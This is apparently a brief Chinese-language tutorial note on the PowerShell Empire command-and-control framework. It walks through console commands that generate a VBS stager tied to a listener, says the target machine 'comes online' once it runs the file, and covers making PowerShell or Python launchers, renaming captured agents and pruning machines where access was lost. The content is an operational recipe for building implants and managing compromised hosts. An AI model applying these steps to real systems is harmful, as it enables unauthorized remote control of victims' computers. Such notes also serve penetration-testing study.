	(Empire: listeners) > usestager windows/launcher_vbs (双击tab键查看所有模块)
	(Empire: stager/windows/launcher_vbs) > info
	必须设置listener的名字，可设置生成位置
	(Empire: stager/windows/launcher_vbs) > set Listener y
	(Empire: stager/windows/launcher_vbs) > execute
	可生成vbs，靶机执行即可上线。
	使用launcher命令直接生成powershell或python脚本
	>launcher powershell Listener-Name
	使用rename对agents更名
	>rename 6NMCW4ZB target1
	使用main命令放回主菜单
	>list stale 列出失去权限的机器
	>remove stale 去除失去权限的机器